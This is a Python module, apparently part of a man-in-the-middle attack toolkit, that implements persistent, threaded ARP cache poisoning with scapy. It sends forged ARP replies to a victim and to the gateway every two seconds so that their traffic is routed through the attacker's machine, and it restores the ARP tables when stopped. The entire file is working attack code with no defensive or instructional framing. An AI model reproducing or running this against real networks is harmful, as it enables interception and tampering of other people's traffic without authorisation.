""" src/attacks/arp_spoofing.py: Module for ARP spoofing attack.

"""
import time
import threading
from scapy.all import ARP, send

from src.core.network import get_mac_for_ip

class ARPSpoofer(threading.Thread):
    """
    A class to perform persistent, threaded ARP cache poisoning.
    It tells the Victim that the Gateway is the Attacker, and vice-versa.
    """

    def __init__(self, target_ip: str, gateway_ip: str, interface: str = None):
        super().__init__()
        self.daemon = True
        
        # Stop the thread gracefully
        self._stop_event = threading.Event()
        
        # Target IPs
        self.target_ip = target_ip     
        self.gateway_ip = gateway_ip   
        
        self.target_mac = get_mac_for_ip(self.target_ip, interface)
        self.gateway_mac = get_mac_for_ip(self.gateway_ip, interface)
        
        if not self.target_mac or not self.gateway_mac:
            raise Exception("Failed to resolve necessary MAC addresses. Check network connectivity.")
            
        print(f"[INFO] Resolved Victim MAC: {self.target_mac}")
        print(f"[INFO] Resolved Gateway MAC: {self.gateway_mac}")

    def _create_spoof_packet(self, pdst: str, hwdst: str, psrc: str) -> ARP:
        """
        Creates an ARP response packet (op=2) that spoofs the source IP.
        The source MAC will automatically be the Attacker's MAC.
        """
        # ARP response/reply
        packet = ARP(op=2, pdst=pdst, hwdst=hwdst, psrc=psrc)
        return packet

    def run(self):
        """The main loop that runs in a separate thread, sending persistent spoofs."""
        print("[INFO] ARP Spoofing thread started (poisoning started).")
        while not self._stop_event.is_set():
            try:
                # 1. Poison the Victim
                # Lie: 'Gateway IP is at Attacker's MAC'
                victim_poison_packet = self._create_spoof_packet(
                    pdst=self.target_ip,    
                    hwdst=self.target_mac,  
                    psrc=self.gateway_ip    
                )

                # 2. Poison the Gateway
                # Lie: 'Victim IP is at Attacker's MAC'
                gateway_poison_packet = self._create_spoof_packet(
                    pdst=self.gateway_ip,   
                    hwdst=self.gateway_mac, 
                    psrc=self.target_ip     
                )
                
                send(victim_poison_packet, verbose=False)
                send(gateway_poison_packet, verbose=False)
                
            except Exception as e:
                print(f"[ERROR] An error occurred during ARP spoofing: {e}")
                
            time.sleep(2) 
        
        print("[INFO] ARP Spoofing thread finished.")


    def stop(self):
        """Signals the thread to stop and restores the ARP tables."""
        print("[INFO] Signaling ARP Spoofing thread to stop...")
        self._stop_event.set() 
        self._restore_arp()

    def _restore_arp(self):
        """Sends legitimate ARP response packets to restore original mappings."""
        
        # Restore Victim's ARP cache
        victim_restore_packet = ARP(
            op=2, 
            pdst=self.target_ip, 
            hwdst=self.target_mac, 
            psrc=self.gateway_ip, 
            hwsrc=self.gateway_mac 
        )
        
        # Restore Gateway's ARP cache 
        gateway_restore_packet = ARP(
            op=2, 
            pdst=self.gateway_ip, 
            hwdst=self.gateway_mac, 
            psrc=self.target_ip, 
            hwsrc=self.target_mac 
        )
        
        print("[INFO] Sending legitimate ARP packets to restore state...")
        # Send a burst of legitimate packets to overwrite the attacker's lie
        for _ in range(5): 
            send(victim_restore_packet, verbose=False)
            send(gateway_restore_packet, verbose=False)
            time.sleep(0.5)

def start_arp_spoof(target_ip: str, gateway_ip: str) -> ARPSpoofer | None:
    """
    The main entry point function called from mitm_pipeline.py.
    """
    try:
        spoofer = ARPSpoofer(target_ip, gateway_ip)
        spoofer.start()
        return spoofer
    except Exception as e:
        print(f"[CRITICAL ERROR] Failed to start ARPSpoofer: {e}")
        return None
